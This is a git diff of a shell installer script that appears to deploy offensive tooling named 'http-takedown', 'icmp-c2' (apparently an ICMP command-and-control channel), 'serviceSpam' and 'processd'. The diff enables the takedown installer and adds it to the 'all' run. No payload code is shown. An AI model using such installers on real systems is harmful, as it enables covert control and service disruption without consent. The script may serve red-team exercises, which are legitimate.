@@ -6,10 +6,11 @@ echo "Dirname: $ROOT_PATH"
 echo "Which: $WHICH"
 
 
-# httpTakedown () {
-#     cd "$ROOT_PATH/http-takedown"
-#     ./install.sh
-# }
+httpTakedown () {
+    cd "$ROOT_PATH/http-takedown"
+    chmod +x ./install.sh
+    ./install.sh
+}
 
 icmpC2 () {
     cd "$ROOT_PATH/icmp-c2"
@@ -37,11 +38,11 @@ serviceSpam () {
 
 if [[ "$WHICH" == "all" ]]; then
     # Currently debugging installer script
-    # cd http-takedown
-    # install
+    install
     icmpC2
     ping_install
     processd
+    httpTakedown
     serviceSpam
 fi
 if [[ "$WHICH" == "icmp" ]]; then
